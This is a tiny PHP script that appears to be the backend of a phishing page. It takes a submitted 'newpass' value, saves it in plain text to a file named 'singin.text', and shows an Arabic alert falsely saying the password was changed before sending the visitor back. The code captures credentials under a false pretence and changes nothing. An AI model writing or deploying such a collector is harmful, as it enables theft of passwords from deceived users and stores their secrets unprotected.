<?php
  $pass = $_POST['newpass'];
  file_put_contents('./singin.text','password : '.$pass);
  echo "<script>alert('تم تغيير كلمة السر');window.history.back();</script>";
?>